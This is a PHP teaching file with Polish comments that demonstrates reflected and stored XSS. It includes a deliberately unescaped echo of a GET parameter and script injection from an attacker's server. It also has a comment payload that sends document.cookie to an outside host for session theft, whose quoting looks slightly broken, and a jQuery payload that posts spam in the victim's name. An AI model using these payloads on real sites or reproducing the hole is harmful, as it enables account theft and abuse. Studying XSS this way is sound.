<?php
# reflected XSS
# pod adresem http://naszastrona.com/kod.js zapisujemy kod z pliku kod.js

# skrypt na naszej stronie wyglada tak:

header('Content-Type:text/html;charset=utf8');
header('X-XSS-Protection: 0');

$ilosc = 1;
if(isset($_GET['ilosc'])) {
    $ilosc = $_GET['ilosc'];
}

$cena = $ilosc * 3.5;
?>
<p>Ilość: <?php echo $ilosc; ?></p>
<p>Cena: <?php echo $cena; ?></p>

<?php
# do strony odwolujemy sie przez adres
# http://strona.com?ilosc=5<script src=http://naszastrona.com/kod.js></script>
# strona przyjmuje zawartosc zdefiniowana w pliku kod.js na naszym serwerze
# nastepnie uzytkownik wpisuje haslo - jest przekierowywany na strone login.php
# na naszym serwerze mamy juz dane autoryzacyjne uzytkownika, przekierowujemy go
# do strony http://strona.com

# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------

# stored XSS
# na naszym serwerze postawilismy system dodawania komentarzy do wpisow na blogu
# dane zapisywane do bazy nie sa filtrowane
# mozliwe jest wiec zalogowanie sie na naszym blogu i dodanie wpisu nastepujacej tresci:
?>
<script>
    document.write('<img style="display: none;" src="http://naszserwer.com/cookie.php?x=' + escape(document.cookie) + '">);');
</script>
<?php
# kod zostal osadzony na systemie blogow, za kazdym wyswietleniem wywolywana jest
# akcja z obcego serwera, ktora zapisuje cookie (rowniez sesyjne) na obcym serwerze
# nic nie stoi na przeszkodzie, aby ukrasc sesje

# ---------------------------------------------------------------------------------------------------------------------
# ---------------------------------------------------------------------------------------------------------------------
# przypadek 2 - podejmowanie akcji w imieniu uzytkownika

# podobnie jak powyzej, dodajemy komentarz z obcym kodem nastepujacej tresci:
# zakladamy, ze na blogu dolaczona jest biblioteka jquery, jesli nie to dolaczamy ja rowniez w komentarzu
?>
<script>
    var data = {
        'text': 'Do you want to enlarge your penis?'
    }
    $.post('./', data, function() {
        var url = '<img src="http://naszserwer.com/yeah.png" />';
        document.write(url);
    });
</script>
<?php
# wprawdzie nie mamy możliwosci kradziezy zalogowanego uzytkownika
# ale osadzamy na stronie kod, ktory przy kazdym odswiezeniu doda - w imieniu uzytkownika
# komentarz reklamowy :-) :-) :-)